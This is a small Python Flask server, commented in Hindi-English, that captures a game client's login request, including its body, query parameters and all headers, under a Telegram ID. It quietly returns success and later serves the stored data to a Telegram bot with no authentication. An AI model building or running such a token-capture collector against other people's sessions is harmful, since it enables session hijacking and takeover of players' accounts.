from flask import Flask, jsonify, request

app = Flask(__name__)

# Temporary memory storage (Production ke liye aap database ya JSON file use kar sakte hain)
# Key: telegram_id, Value: captured token/payload data
TOKEN_DATABASE = {}

@app.route("/<telegram_id>/", methods=["GET", "POST", "PUT"])
def handle_game_login(telegram_id):
  try:
    # 1. Game se aane wale data (JSON body, Form data, ya Headers) ko capture karna
    req_data = request.get_json(silent=True) or request.form.to_dict()
    req_headers = dict(request.headers)
    req_args = request.args.to_dict()

    # 2. Data ko database/memory mein store karna us Telegram ID ke against
    TOKEN_DATABASE[telegram_id] = {
        "query_params": req_args,
        "json_body": req_data,
        "headers": req_headers,
    }

    print(f"[+] Token Captured for Telegram ID: {telegram_id}")
    print(f"Data: {req_data}")

    # 3. Game ko ek successful response bhejna taaki game ka login flow na ruke
    return jsonify(
        {"success": True, "message": "Session captured successfully"}
    ), 200

  except Exception as e:
    print(f"[-] Error: {str(e)}")
    return jsonify({"success": False, "error": str(e)}), 500


# Telegram Bot ke liye endpoint jahan se bot token fetch karega
@app.route("/get_token/<telegram_id>", methods=["GET"])
def get_token(telegram_id):
  if telegram_id in TOKEN_DATABASE:
    data = TOKEN_DATABASE[telegram_id]
    return jsonify({"exists": True, "data": data}), 200
  else:
    return jsonify({"exists": False, "message": "No token found"}), 404


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5000)
  
